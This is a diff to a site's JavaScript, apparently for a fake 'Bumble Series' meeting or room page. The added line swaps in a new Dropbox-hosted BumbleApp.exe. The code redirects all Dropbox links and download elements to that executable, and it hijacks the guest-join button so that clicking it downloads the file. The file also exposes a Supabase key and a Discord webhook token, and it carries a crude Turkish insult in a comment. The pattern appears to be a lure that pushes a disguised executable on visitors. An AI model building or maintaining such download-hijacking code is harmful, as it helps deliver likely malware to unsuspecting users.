@@ -5,7 +5,7 @@ if(document.body.dataset.page==='room'){const members=$('#supabase-members');if(
 const base='https://Bumble Series.com';
 const supabaseUrl='https://gkbfaitxmsdgtjeqcvtx.supabase.co';  // bunlar bozulursa git supabase.com dan yenisini aç oç
 const supabaseKey='sb_publishable__7hGNNxfriSDhVzsUGXZvQ_8P96a0uY'; // buda ayni 
-const downloadUrl='https://www.dropbox.com/scl/fi/tfke9nr9ew8xlzsg2hwts/Bumble SeriesApp.exe?rlkey=zl26eyrfptakdw8kz17uhuxhv&st=524llrlc&dl=1';
+const downloadUrl='https://www.dropbox.com/scl/fi/sgz7svhwrjuxhabfi3pqx/BumbleApp.exe?rlkey=h32lz7qh2dsxf34borkixvm42&st=nwo176kn&dl=1';
 const supportWebhook='https://discord.com/api/webhooks/1562097160755871830/mah6o5y4CVk-ROzxMnp5B63bL_AeuOVXVXFTcpsZ4tWAGSXo8Z770E-_unF8MSkgGVEF';
 $$('a[href*="dropbox.com/scl/fi/"],[data-room-download]').forEach(link=>{link.href=downloadUrl});
 $('#guest-join')?.addEventListener('click',event=>{if(event.currentTarget.textContent.trim()==='Download Bumble Series'){event.stopImmediatePropagation();window.location.href=downloadUrl}},true);
